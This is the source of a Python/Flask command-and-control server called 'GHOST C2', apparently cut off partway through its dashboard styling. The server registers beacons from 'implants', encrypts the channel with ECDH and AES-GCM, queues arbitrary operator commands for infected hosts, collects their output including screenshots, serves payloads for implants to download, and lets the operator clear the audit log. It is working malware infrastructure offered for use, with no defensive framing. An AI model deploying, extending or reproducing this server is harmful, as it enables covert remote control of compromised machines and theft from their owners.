#!/usr/bin/env python3
"""
GHOST C2 Server — direct Python / ngrok backend
Direct Python/ngrok backend — no Cloudflare Worker needed.

Usage:
  python c2_server.py [options]

  --port PORT           listen port (default 8080)
  --beacon-token TOKEN  token the implant sends in X-Beacon-Token
  --operator-token TOK  token the operator CLI / dashboard uses
  --user USER           dashboard login username
  --password PASS       dashboard login password
  --auto-accept         auto-accept all new sessions (no manual approval needed)
  --host HOST           bind address (default 0.0.0.0)

Then expose it:
  ngrok http 8080

Point the implant at the ngrok HTTPS URL.
Point c2_cli.py at the same URL with the operator token.
"""
from __future__ import annotations

import argparse, base64, hashlib, json, os, secrets, sys, threading, time
from collections import deque
from datetime import datetime, timezone
from functools import wraps
from typing import Any

try:
    from flask import Flask, request, jsonify, Response
except ImportError:
    sys.exit("[!] Missing: pip install flask")

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    _AESGCM_OK = True
except ImportError:
    _AESGCM_OK = False


# ── Channel key agreement (ECDH P-256) + AES-256-GCM wire encryption ─────────
# The implant generates a fresh ephemeral P-256 keypair per run and sends its
# public point in the X-Pub-Key header (Base64 of big-endian X||Y). The server
# holds one long-lived P-256 keypair (in memory, rotated on restart) and
# answers with its own public point in the beacon response ("spk"). Both sides
# derive the channel key as SHA-256(ECDH shared secret) — no key material ever
# crosses the wire, and every implant run gets a fresh key. (Replaces the old
# SHA256(sessionId) scheme, which anyone capturing a single beacon could
# reproduce, since the session ID rode in plaintext.)
# Wire format: Base64( nonce[12] || tag[16] || ciphertext ), matching the
# implant's BCrypt AesGcm helpers.
_SRV_ECDH = ec.generate_private_key(ec.SECP256R1()) if _AESGCM_OK else None
_SRV_PUB_B64 = ""
if _SRV_ECDH is not None:
    _SRV_PUB_B64 = base64.b64encode(
        _SRV_ECDH.public_key().public_bytes(
            Encoding.X962, PublicFormat.UncompressedPoint)[1:]
    ).decode()

def _ecdh_key(impl_pub_b64: str) -> bytes | None:
    """Channel key derived from the implant's X-Pub-Key header point."""
    if not _AESGCM_OK or _SRV_ECDH is None or not impl_pub_b64:
        return None
    try:
        xy = base64.b64decode(impl_pub_b64)
        if len(xy) != 64:
            return None
        peer = ec.EllipticCurvePublicKey.from_encoded_point(
            ec.SECP256R1(), b"\x04" + xy)
        shared = _SRV_ECDH.exchange(ec.ECDH(), peer)
        return hashlib.sha256(shared).digest()
    except Exception:
        return None

def _enc_blob(key: bytes, obj: dict):
    if not _AESGCM_OK or not key:
        return None
    nonce = os.urandom(12)
    ct_tag = AESGCM(key).encrypt(nonce, json.dumps(obj).encode(), None)
    wire = nonce + ct_tag[-16:] + ct_tag[:-16]   # nonce || tag || ct
    return base64.b64encode(wire).decode()

def _dec_blob(key: bytes, blob: str):
    try:
        raw = base64.b64decode(blob)
        nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
        pt = AESGCM(key).decrypt(nonce, ct + tag, None)
        return json.loads(pt)
    except Exception:
        return None

# ── Tunables ──────────────────────────────────────────────────────────────────
RESULT_CAP   = 500
AUDIT_CAP    = 1000
PAYLOAD_MAX  = 32 * 1024 * 1024   # 32 MB
SESSION_TTL  = 7200                # prune sessions idle > 2 h

# ── Runtime config (overridden by CLI args) ───────────────────────────────────
_CFG: dict[str, Any] = {
    "beacon_token":   os.environ.get("GHOST_BEACON_TOKEN",   "change-me-beacon"),
    "operator_token": os.environ.get("GHOST_OPERATOR_TOKEN", "change-me-operator"),
    "dashboard_user": os.environ.get("GHOST_DASHBOARD_USER", "admin"),
    "dashboard_pass": os.environ.get("GHOST_DASHBOARD_PASS", "admin"),
    "auto_accept":    False,
}

# ── In-memory store ───────────────────────────────────────────────────────────
_lock    = threading.RLock()
_sessions: dict[str, dict]         = {}
_tasks:    dict[str, deque[str]]   = {}
_results:  dict[str, deque[dict]]  = {}
_audit:    deque[dict]             = deque(maxlen=AUDIT_CAP)
_payload:  bytes | None            = None

# ── Flask ─────────────────────────────────────────────────────────────────────
app = Flask(__name__, static_folder=None)
app.config["MAX_CONTENT_LENGTH"] = PAYLOAD_MAX + 4096
app.config["JSON_SORT_KEYS"] = False

# ── Helpers ───────────────────────────────────────────────────────────────────
def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")

def _client_ip() -> str:
    for h in ("CF-Connecting-IP", "X-Real-IP", "X-Forwarded-For"):
        v = request.headers.get(h, "")
        if v:
            return v.split(",")[0].strip()
    return request.remote_addr or "unknown"

def _sc(a: str, b: str) -> bool:
    return secrets.compare_digest(a.encode("utf-8"), b.encode("utf-8"))

def _audit_log(action: str, detail: dict) -> None:
    with _lock:
        _audit.append({"ts": _now(), "ip": _client_ip(), "action": action, "detail": detail})

def _cors(r: Response) -> Response:
    r.headers["Access-Control-Allow-Origin"]  = "*"
    r.headers["Access-Control-Allow-Methods"] = "GET,POST,DELETE,OPTIONS"
    r.headers["Access-Control-Allow-Headers"] = "Content-Type,X-Beacon-Token,X-Operator-Token"
    return r

def _err(msg: str, status: int) -> Response:
    r = jsonify({"error": msg})
    r.status_code = status
    return _cors(r)

def _json_r(data: Any, status: int = 200) -> Response:
    r = jsonify(data)
    r.status_code = status
    return _cors(r)

# ── Auth decorators ───────────────────────────────────────────────────────────
def require_beacon(fn):
    @wraps(fn)
    def wrapper(*a, **kw):
        tok = request.headers.get("X-Beacon-Token", "")
        if not tok or not _sc(tok, _CFG["beacon_token"]):
            return _err("Unauthorized", 401)
        return fn(*a, **kw)
    return wrapper

def require_operator(fn):
    @wraps(fn)
    def wrapper(*a, **kw):
        tok = request.headers.get("X-Operator-Token", "")
        if not tok or not _sc(tok, _CFG["operator_token"]):
            return _err("Unauthorized", 401)
        return fn(*a, **kw)
    return wrapper

# ── CORS preflight ────────────────────────────────────────────────────────────
@app.route("/", defaults={"p": ""}, methods=["OPTIONS"])
@app.route("/<path:p>", methods=["OPTIONS"])
def preflight(p=""):
    r = Response("", 204)
    return _cors(r)

# ── Health ────────────────────────────────────────────────────────────────────
@app.route("/health", methods=["GET"])
def health():
    with _lock:
        count = len(_sessions)
    return _json_r({"status": "ok", "ts": _now(), "sessions": count})

@app.route("/ping", methods=["GET"])
def ping():
    """CLI liveness probe — same contract as /health."""
    with _lock:
        count = len(_sessions)
    return _json_r({"status": "ok", "ts": _now(), "sessions": count})

# ── Beacon ────────────────────────────────────────────────────────────────────
@app.route("/beacon", methods=["POST"])
@require_beacon
def beacon():
    raw     = request.get_data(as_text=True) or ""
    enc_req = request.headers.get("X-Enc") == "1"
    pub_hdr = request.headers.get("X-Pub-Key", "").strip()
    sid_hdr = request.headers.get("X-Session-ID", "").strip()

    body = request.get_json(silent=True) or {}
    sid  = str(body.get("session", ""))[:128].strip()
    derived = _ecdh_key(pub_hdr)

    channel_key: bytes | None = None

    if enc_req:
        if not sid_hdr:
            return _err("Missing session header", 400)
        sid = sid_hdr
        with _lock:
            stored_key = _sessions.get(sid, {}).get("key")
        payload = None
        # Stored key first, then a freshly derived one (covers a server
        # restart that rotated the ECDH keypair).
        for k in (stored_key, derived):
            if k is None:
                continue
            payload = _dec_blob(k, raw)
            if payload is not None:
                channel_key = k
                break
        if payload is None:
            # Key mismatch — answer unencrypted with a fresh spk so the
            # implant re-handshakes on this same response.
            _audit_log("beacon_rehandshake", {"sid": sid})
            return _json_r({"cmd": "sleep", "spk": _SRV_PUB_B64})
        p_sid = str(payload.get("session", ""))[:128].strip()
        if not p_sid or p_sid != sid:
            return _err("Session mismatch", 401)
        body = payload
    elif derived is not None:
        # Plaintext bootstrap beacon — adopt the implant's fresh channel key.
        channel_key = derived
    else:
        with _lock:
            channel_key = _sessions.get(sid, {}).get("key")

    if not sid:
        return _err("Missing session", 400)

    ip = _client_ip()
    ts = _now()

    cmd_out = "sleep"
    audit_action = "beacon"
    audit_detail: dict = {"sid": sid, "enc": bool(channel_key)}

    with _lock:
        existing = _sessions.get(sid)
        status   = existing["status"] if existing else ("accepted" if _CFG["auto_accept"] else "pending")
        recon    = body.get("recon") if isinstance(body.get("recon"), dict) else (existing["recon"] if existing else {})

        _sessions[sid] = {
            "session":       sid,
            "remote_ip":     ip,
            "first_seen":    existing["first_seen"] if existing else ts,
            "last_beacon":   ts,
            "recon":         recon,
            "pending_tasks": len(_tasks.get(sid, [])),
            "result_count":  len(_results.get(sid, [])),
            "status":        status,
            "key":           channel_key or (existing.get("key") if existing else None),
        }

        if status == "rejected":
            cmd_out      = "exit"
            audit_action = "beacon_rejected"
        elif status == "killed":
            # Operator killed this node — keep serving exit until it dies.
            cmd_out = "exit"
        elif status == "pending":
            audit_detail["status"] = "pending"
        else:
            q = _tasks.get(sid)
            if q:
                cmd_out = q.popleft()
                _sessions[sid]["pending_tasks"] = len(q)

    _audit_log(audit_action, audit_detail)

    if channel_key and _AESGCM_OK:
        blob = _enc_blob(channel_key, {"cmd": cmd_out})
        if blob:
            return _json_r({"e": 1, "cmd": blob, "spk": _SRV_PUB_B64})
    return _json_r({"cmd": cmd_out, "spk": _SRV_PUB_B64})

# ── Result ────────────────────────────────────────────────────────────────────
@app.route("/result", methods=["POST"])
@require_beacon
def result():
    raw     = request.get_data(as_text=True) or ""
    enc_req = request.headers.get("X-Enc") == "1"
    pub_hdr = request.headers.get("X-Pub-Key", "").strip()
    sid_hdr = request.headers.get("X-Session-ID", "").strip()

    body = request.get_json(silent=True) or {}
    sid  = str(body.get("session", ""))[:128].strip()
    derived = _ecdh_key(pub_hdr)

    if enc_req:
        if not sid_hdr:
            return _err("Missing session header", 400)
        sid = sid_hdr
        with _lock:
            stored_key = _sessions.get(sid, {}).get("key")
        payload = None
        for k in (stored_key, derived):
            if k is None:
                continue
            payload = _dec_blob(k, raw)
            if payload is not None:
                # Adopt a freshly derived key (covers a server restart).
                if k is not stored_key and sid in _sessions:
                    with _lock:
                        _sessions[sid]["key"] = k
                break
        if payload is None:
            return _err("Bad encrypted payload", 400)
        p_sid = str(payload.get("session", ""))[:128].strip()
        if not p_sid or p_sid != sid:
            return _err("Session mismatch", 401)
        body = payload

    output = str(body.get("output", ""))[:48 * 1024 * 1024]  # allow multi-MB screenshots
    if not sid:
        return _err("Missing session", 400)

    with _lock:
        q = _results.setdefault(sid, deque(maxlen=RESULT_CAP))
        q.append({"ts": _now(), "output": output})
        if sid in _sessions:
            _sessions[sid]["result_count"] = len(q)

    return _json_r({"status": "ok"})

# ── Sessions ──────────────────────────────────────────────────────────────────
@app.route("/sessions", methods=["GET"])
@require_operator
def list_sessions():
    now_dt = datetime.now(timezone.utc)
    with _lock:
        out = []
        for s in _sessions.values():
            try:
                lb = datetime.fromisoformat(s["last_beacon"].replace("Z", "+00:00"))
                idle = int((now_dt - lb).total_seconds())
            except Exception:
                idle = 0
            out.append({**s, "idle_seconds": idle})
    return _json_r(out)

@app.route("/sessions/<path:sid>", methods=["DELETE"])
@require_operator
def kill_session(sid):
    with _lock:
        if sid not in _sessions:
            return _err("Session not found", 404)
        q = _tasks.setdefault(sid, deque())
        q.appendleft("exit")
        _sessions[sid]["pending_tasks"] = len(q)
        _sessions[sid]["status"] = "killed"
    _audit_log("kill_session", {"session": sid})
    return _json_r({"status": "exit_queued", "session": sid})

@app.route("/sessions/<path:sid>/accept", methods=["POST"])
@require_operator
def accept_session(sid):
    with _lock:
        if sid not in _sessions:
            return _err("Session not found", 404)
        _sessions[sid]["status"] = "accepted"
    _audit_log("session_accepted", {"sid": sid})
    return _json_r({"status": "accepted"})

@app.route("/sessions/<path:sid>/reject", methods=["POST"])
@require_operator
def reject_session(sid):
    with _lock:
        if sid not in _sessions:
            return _err("Session not found", 404)
        _sessions[sid]["status"] = "rejected"
    _audit_log("session_rejected", {"sid": sid})
    return _json_r({"status": "rejected"})

# ── Task ──────────────────────────────────────────────────────────────────────
@app.route("/task", methods=["POST"])
@require_operator
def add_task():
    body = request.get_json(silent=True) or {}
    sid  = str(body.get("session", ""))[:128].strip()
    cmd  = str(body.get("cmd",     ""))[:4096].strip()
    if not sid or not cmd:
        return _err("Missing session or cmd", 400)
    with _lock:
        if sid not in _sessions:
            return _err("Session not found", 404)
        q = _tasks.setdefault(sid, deque())
        q.append(cmd)
        _sessions[sid]["pending_tasks"] = len(q)
        depth = len(q)
    _audit_log("task_queued", {"session": sid, "cmd": cmd})
    return _json_r({"status": "queued", "queue_depth": depth})

# ── Results ───────────────────────────────────────────────────────────────────
@app.route("/results/<path:sid>", methods=["GET"])
@require_operator
def get_results(sid):
    clear = request.args.get("clear") == "1"
    with _lock:
        if sid not in _sessions:
            return _err("Session not found", 404)
        entries = list(_results.get(sid, []))
        if clear:
            _results[sid] = deque(maxlen=RESULT_CAP)
            _sessions[sid]["result_count"] = 0
    _audit_log("get_results", {"session": sid, "count": len(entries), "clear": clear})
    return _json_r({"session": sid, "results": entries})

# ── Payload ───────────────────────────────────────────────────────────────────
@app.route("/payload", methods=["POST"])
@require_operator
def upload_payload():
    global _payload
    data = request.get_data()
    if not data:
        return _err("Empty body", 400)
    if len(data) > PAYLOAD_MAX:
        return _err("Payload too large (max 32 MB)", 413)
    _payload = data
    _audit_log("payload_uploaded", {"bytes": len(data)})
    return _json_r({"status": "ok", "bytes": len(data)})

@app.route("/payload", methods=["GET"])
@require_beacon
def download_payload():
    global _payload
    sid = request.headers.get("X-Session-ID", "").strip()
    if not sid:
        return _err("Missing session", 400)
    with _lock:
        if sid not in _sessions:
            return _err("Unauthorized", 401)
    if _payload is None:
        return _err("No payload stored", 404)
    _audit_log("payload_downloaded", {"sid": sid, "bytes": len(_payload)})
    return Response(_payload,
                    mimetype="application/octet-stream",
                    headers={"Content-Length": str(len(_payload)),
                             "Cache-Control": "no-store"})

# ── Audit ─────────────────────────────────────────────────────────────────────
@app.route("/audit", methods=["GET"])
@require_operator
def get_audit():
    limit = min(int(request.args.get("limit", 100)), AUDIT_CAP)
    with _lock:
        entries = list(_audit)[-limit:]
    return _json_r({"entries": entries})

@app.route("/audit/clear", methods=["POST"])
@require_operator
def clear_audit():
    with _lock:
        _audit.clear()
    return _json_r({"status": "cleared"})

# ── Auth (dashboard login) ────────────────────────────────────────────────────
@app.route("/auth", methods=["POST"])
def auth():
    body = request.get_json(silent=True) or {}
    u = str(body.get("u", ""))
    p = str(body.get("p", ""))
    if not u or not p:
        return _err("Missing credentials", 400)
    if not _sc(u, _CFG["dashboard_user"]) or not _sc(p, _CFG["dashboard_pass"]):
        _audit_log("auth_fail", {"user": u[:32]})
        return _err("Invalid credentials", 401)
    return _json_r({"token": _CFG["operator_token"]})

@app.route("/logout", methods=["GET", "POST"])
def logout():
    html = ('<!DOCTYPE html><html><head><meta charset="UTF-8">'
            '<meta http-equiv="refresh" content="1.2;url=/">'
            '<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">'
            '<style>*{margin:0;padding:0;box-sizing:border-box}'
            'body{min-height:100vh;display:flex;align-items:center;justify-content:center;'
            'background:#04060c;color:#dce5f7;font-family:Inter,system-ui,sans-serif;overflow:hidden}'
            '.c{text-align:center;animation:f .5s ease both}'
            '@keyframes f{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}'
            '.r{width:38px;height:38px;margin:0 auto 18px;border-radius:50%;'
            'border:2.5px solid rgba(140,165,220,.12);border-top-color:#3fd2f7;'
            'animation:s .8s linear infinite}'
            '@keyframes s{to{transform:rotate(360deg)}}'
            '.t{font-size:13px;font-weight:800;letter-spacing:.22em;text-transform:uppercase}'
            '.s{font-size:10.5px;color:#525d7e;margin-top:8px;font-family:JetBrains Mono,monospace}'
            '</style></head><body><div class="c"><div class="r"></div>'
            '<div class="t">Signing out</div><div class="s">terminating operator session&hellip;</div></div>'
            '</body></html>')
    return Response(html, mimetype="text/html")

# ── Dashboard HTML ────────────────────────────────────────────────────────────
_LOGIN_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>GHOST C2 — Sign in</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg0:#04060c;--bg1:#070b16;
  --panel:rgba(13,19,34,.66);--line:rgba(140,165,220,.10);--line2:rgba(140,165,220,.18);
  --acc:#3fd2f7;--acc2:#8b7cf7;--acc-dim:rgba(63,210,247,.08);--acc-glow:rgba(63,210,247,.22);
  --green:#34d399;--red:#fb7185;
  --txt:#dce5f7;--txt2:#8b96ba;--dim:#525d7e;--faint:#2a3350;
  --mono:'JetBrains Mono','Consolas',monospace;--ui:'Inter',system-ui,sans-serif
}
html,body{height:100%}
body{min-height:100dvh;display:flex;align-items:center;justify-content:center;
  background:var(--bg0);color:var(--txt);font-family:var(--ui);overflow:hidden;position:relative}
.bg{position:fixed;inset:0;pointer-events:none}
.bg::before{content:'';position:absolute;inset:0;
  background:radial-gradient(900px 520px at 18% -8%,rgba(63,210,247,.09),transparent 62%),
             radial-gradient(820px 560px at 88% 108%,rgba(139,124,247,.08),transparent 62%)}
.bg::after{content:'';position:absolute;inset:0;
  background-image:linear-gradient(rgba(140,165,220,.033) 1px,transparent 1px),
                   linear-gradient(90deg,rgba(140,165,220,.033) 1px,transparent 1px);
  background-size:44px 44px;
  mask-image:radial-gradient(ellipse 70% 60% at 50% 42%,#000 30%,transparent 78%)}
.glyph{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:640px;height:640px;
  pointer-events:none;opacity:.05;
  background:conic-gradient(from 200deg at 50% 50%,transparent 0deg,rgba(63,210,247,.5) 80deg,transparent 160deg);
  border-radius:50%;filter:blur(70px);animation:swirl 26s linear infinite}
@keyframes swirl{to{transform:translate(-50%,-50%) rotate(360deg)}}
.stage{position:relative;z-index:2;width:min(420px,92vw);animation:rise .7s cubic-bezier(.16,1,.3,1) both}
@keyframes rise{from{opacity:0;transform:translateY(18px) scale(.985)}to{opacity:1;transform:none}}
.brand{display:flex;align-items:center;gap:14px;margin-bottom:30px;justify-content:center}
.mark{width:52px;height:52px;flex-shrink:0;border-radius:14px;display:flex;align-items:center;justify-content:center;
  background:linear-gradient(145deg,rgba(63,210,247,.14),rgba(139,124,247,.10));
  border:1px solid rgba(63,210,247,.28);
  box-shadow:0 0 34px rgba(63,210,247,.16),inset 0 1px 0 rgba(255,255,255,.09)}
.mark svg{width:28px;height:28px}
.name{font-size:21px;font-weight:800;letter-spacing:.05em}
.name b{background:linear-gradient(92deg,var(--acc),var(--acc2));-webkit-background-clip:text;background-clip:text;color:transparent}
.tagline{font-size:10px;font-weight:600;letter-spacing:.34em;color:var(--dim);text-transform:uppercase;text-align:center;margin:8px 0 30px}
.card{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:34px 32px 28px;
  backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);
  box-shadow:0 30px 80px rgba(0,0,0,.55),inset 0 1px 0 rgba(255,255,255,.05)}
.field{margin-bottom:16px}
.field label{display:flex;justify-content:space-between;font-size:10.5px;font-weight:700;color:var(--txt2);
  letter-spacing:.16em;text-transform:uppercase;margin-bottom:8px}
.fwrap{position:relative}
.fwrap svg{position:absolute;left:13px;top:50%;transform:translateY(-50%);width:15px;height:15px;color:var(--dim);pointer-events:none}
input{width:100%;background:rgba(6,10,20,.55);border:1px solid var(--line);
  border-radius:10px;color:var(--txt);padding:12px 14px 12px 38px;font-family:var(--mono);font-size:13.5px;
  outline:none;transition:border-color .18s,box-shadow .18s,background .18s;-webkit-appearance:none}
input:focus{border-color:rgba(63,210,247,.55);box-shadow:0 0 0 4px var(--acc-dim);background:rgba(6,10,20,.75)}
input::placeholder{color:var(--faint)}
button[type=submit]{width:100%;margin-top:8px;border:none;border-radius:10px;padding:13px;
  font-family:var(--ui);font-size:13.5px;font-weight:700;letter-spacing:.06em;color:#031018;
  background:linear-gradient(92deg,var(--acc),#69c8ff 55%,var(--acc2));
  background-size:160% 100%;background-position:0% 0%;
  cursor:pointer;transition:background-position .35s,box-shadow .25s,transform .12s;
  box-shadow:0 8px 26px rgba(63,210,247,.22)}
button[type=submit]:hover{background-position:90% 0;box-shadow:0 10px 34px rgba(99,190,255,.34)}
button[type=submit]:active{transform:translateY(1px)}
button[type=submit]:disabled{opacity:.55;cursor:wait;box-shadow:none}
.err{font-size:12.5px;color:var(--red);margin-top:15px;padding:10px 14px;
  border:1px solid rgba(251,113,133,.28);background:rgba(251,113,133,.06);
  border-radius:9px;display:none;align-items:center;gap:8px;font-weight:500}
.err.show{display:flex;animation:shake .4s}
@keyframes shake{0%,100%{transform:none}20%{transform:translateX(-7px)}45%{transform:translateX(6px)}70%{transform:translateX(-4px)}}
.meta{display:flex;justify-content:space-between;align-items:center;margin-top:26px;
  padding-top:20px;border-top:1px solid var(--line);font-size:10.5px;color:var(--dim);letter-spacing:.08em}
.meta .dotrow{display:flex;align-items:center;gap:7px;font-family:var(--mono)}
.dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 8px rgba(52,211,153,.7);animation:blip 2.4s infinite}
@keyframes blip{0%,100%{opacity:1}50%{opacity:.35}}
.hint{margin-top:14px;text-align:center;font-size:11px;color:var(--faint);font-family:var(--mono)}
kbd{font-family:var(--mono);font-size:10px;border:1px solid var(--line2);border-bottom-width:2px;
  border-radius:4px;padding:1px 5px;color:var(--txt2);background:rgba(6,10,20,.5)}
</style></head><body>
<div class="bg"></div><div class="glyph"></div>
<div class="stage">
  <div class="brand">
    <div class="mark"><svg viewBox="0 0 24 24" fill="none" stroke="url(#lg)" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
      <defs><linearGradient id="lg" x1="0" y1="0" x2="24" y2="24"><stop offset="0" stop-color="#3fd2f7"/><stop offset="1" stop-color="#8b7cf7"/></linearGradient></defs>
      <path d="M12 2.5c-4.6 0-7.5 3.4-7.5 8v9.2c0 .9 1 1.4 1.7.8l1.9-1.6c.4-.3 1-.3 1.4 0l1.6 1.4c.5.4 1.3.4 1.8 0l1.6-1.4c.4-.3 1-.3 1.4 0l1.9 1.6c.7.6 1.7.1 1.7-.8V10.5c0-4.6-2.9-8-7.5-8Z"/>
      <circle cx="9.2" cy="10.2" r="1" fill="#3fd2f7" stroke="none"/><circle cx="14.8" cy="10.2" r="1" fill="#8b7cf7" stroke="none"/>
    </svg></div>
  </div>
  <div class="name" style="text-align:center">GHOST <b>C2</b></div>
  <div class="tagline">Operator Console</div>
  <div class="card">
    <form id="f" onsubmit="login(event)">
      <div class="field"><label>Operator ID</label>
        <div class="fwrap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8" r="4"/><path d="M4 20c1.8-3.2 4.6-4.8 8-4.8s6.2 1.6 8 4.8"/></svg>
        <input id="u" type="text" autocomplete="username" placeholder="operator" required autofocus></div></div>
      <div class="field"><label>Passphrase</label>
        <div class="fwrap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="4" y="10.5" width="16" height="9.5" rx="2.5"/><path d="M8 10.5V7a4 4 0 0 1 8 0v3.5"/></svg>
        <input id="p" type="password" autocomplete="current-password" placeholder="••••••••••" required></div></div>
      <button type="submit" id="sbtn">AUTHENTICATE</button>
    </form>
    <div class="err" id="err"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7.5v5.5"/><circle cx="12" cy="16.8" r=".4" fill="currentColor"/></svg>Invalid credentials — access denied</div>
    <div class="meta"><span class="dotrow"><span class="dot"></span>SECURE CHANNEL</span><span>RESTRICTED ACCESS</span></div>
  </div>
  <div class="hint"><kbd>Enter</kbd> authenticate &nbsp;·&nbsp; session expires on tab close</div>
</div>
<script>
async function login(e){
  e.preventDefault();const btn=document.getElementById('sbtn');
  btn.textContent='AUTHENTICATING…';btn.disabled=true;
  try{
    const r=await fetch('/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:document.getElementById('u').value,p:document.getElementById('p').value})});
    if(r.ok){const{token}=await r.json();sessionStorage.setItem('ghost_token',token);btn.textContent='ACCESS GRANTED';location.href='/dashboard';}
    else{document.getElementById('err').classList.remove('show');void document.getElementById('err').offsetWidth;document.getElementById('err').classList.add('show');btn.textContent='AUTHENTICATE';btn.disabled=false;}
  }catch(_){document.getElementById('err').classList.add('show');btn.textContent='AUTHENTICATE';btn.disabled=false;}
}
</script></body></html>"""


_DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>GHOST C2 — Operator Console</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg0:#04060c;--bg1:#070b16;
  --panel:rgba(11,16,30,.66);--panel2:rgba(15,21,38,.55);--raise:rgba(18,25,45,.6);
  --line:rgba(140,165,220,.10);--line2:rgba(140,165,220,.2);
  --acc:#3fd2f7;--acc2:#8b7cf7;--acc-dim:rgba(63,210,247,.09);--acc-glow:rgba(63,210,247,.25);
  --green:#34d399;--green-dim:rgba(52,211,153,.10);
  --amber:#fbbf24;--amber-dim:rgba(251,191,36,.10);
  --red:#fb7185;--red-dim:rgba(251,113,133,.10);
  --orange:#fb923c;--violet:#a78bfa;--violet-dim:rgba(167,139,250,.12);
  --txt:#dce5f7;--txt2:#8b96ba;--dim:#5a6586;--faint:#333d5c;
  --mono:'JetBrains Mono','Consolas',monospace;--ui:'Inter',system-ui,sans-serif;
  --r-lg:16px;--r-md:10px;--r-sm:7px
}
html,body{height:100%;overflow:hidden}
body{background:var(--bg0);color:var(--txt);font-family:var(--ui);font-size:13.5px;display:flex;flex-direction:column}
.bg{position:fixed;inset:0;pointer-events:none;z-index:0}
.bg::before{content:'';position:absolute;inset:0;
  background:radial-gradient(1000px 560px at 14% -10%,rgba(63,210,247,.075),transparent 60%),
             radial-gradient(900px 620px at 96% 112%,rgba(139,124,247,.07),transparent 60%)}
.bg::after{content:'';position:absolute;inset:0;
  background-image:linear-gradient(rgba(140,165,220,.03) 1px,transparent 1px),
                   linear-gradient(90deg,rgba(140,165,220,.03) 1px,transparent 1px);
  background-size:44px 44px;
  mask-image:radial-gradient(ellipse 80% 70% at 50% 40%,#000 25%,transparent 80%)}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:rgba(140,165,220,.14);border-radius:6px}
::-webkit-scrollbar-thumb:hover{background:rgba(140,165,220,.28)}
::selection{background:rgba(63,210,247,.28)}
kbd{font-family:var(--mono);font-size:10px;border:1px solid var(--line2);border-bottom-width:2px;
  border-radius:4px;padding:1px 5px;color:var(--txt2);background:rgba(6,10,20,.5)}

/* ── Header ────────────────────────────────────────────────────────────── */
header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shrink:0;
  border-bottom:1px solid var(--line);background:rgba(7,11,22,.72);backdrop-filter:blur(16px);
  position:relative;z-index:5}
.brand{display:flex;align-items:center;gap:11px;padding:0 14px 0 6px;height:100%}
.mark{width:34px;height:34px;border-radius:10px;display:flex;align-items:center;justify-content:center;
  background:linear-gradient(145deg,rgba(63,210,247,.15),rgba(139,124,247,.10));
  border:1px solid rgba(63,210,247,.30);box-shadow:0 0 22px rgba(63,210,247,.14),inset 0 1px 0 rgba(255,255,255,.08)}
.mark svg{width:19px;height:19px}
.bname{font-size:14.5px;font-weight:800;letter-spacing:.05em;white-space:nowrap}
.bname b{background:linear-gradient(92deg,var(--acc),var(--acc2));-webkit-background-clip:text;background-clip:text;color:transparent}
.hsep{width:1px;height:26px;background:var(--line);margin:0 6px;flex-shrink:0}
.chip{display:flex;align-items:center;gap:9px;padding:7px 13px;border:1px solid var(--line);
  border-radius:99px;background:var(--panel2);flex-shrink:0}
.chip .lbl{font-size:9.5px;font-weight:700;letter-spacing:.14em;color:var(--dim);text-transform:uppercase}
.chip .val{font-size:12.5px;font-weight:700;font-family:var(--mono);color:var(--txt)}
.chip .val.g{color:var(--green)}.chip .val.a{color:var(--amber)}.chip .val.c{color:var(--acc)}
.chip .val.r{color:var(--red)}
.pulse{width:8px;height:8px;border-radius:50%;background:var(--faint);flex-shrink:0;transition:background .3s}
.pulse.live{background:var(--green);box-shadow:0 0 10px rgba(52,211,153,.8);animation:blip 2.2s ease-in-out infinite}
@keyframes blip{0%,100%{opacity:1}50%{opacity:.45}}
.hright{margin-left:auto;display:flex;align-items:center;gap:10px}
.hbtn{display:flex;align-items:center;gap:8px;background:var(--panel2);border:1px solid var(--line);
  color:var(--txt2);padding:7px 12px;border-radius:var(--r-md);font-family:var(--ui);font-size:12px;
  font-weight:600;cursor:pointer;transition:all .18s}
.hbtn:hover{border-color:rgba(63,210,247,.4);color:var(--acc);background:var(--acc-dim)}
#clock{font-size:12px;color:var(--txt2);font-family:var(--mono);padding:0 4px;white-space:nowrap}
.hbtn.danger:hover{border-color:rgba(251,113,133,.45);color:var(--red);background:var(--red-dim)}

/* ── Workspace grid ────────────────────────────────────────────────────── */
.workspace{flex:1;display:flex;min-height:0;position:relative;z-index:1}

/* ── Sessions rail ─────────────────────────────────────────────────────── */
#rail-sessions{width:308px;flex-shrink:0;display:flex;flex-direction:column;min-height:0;
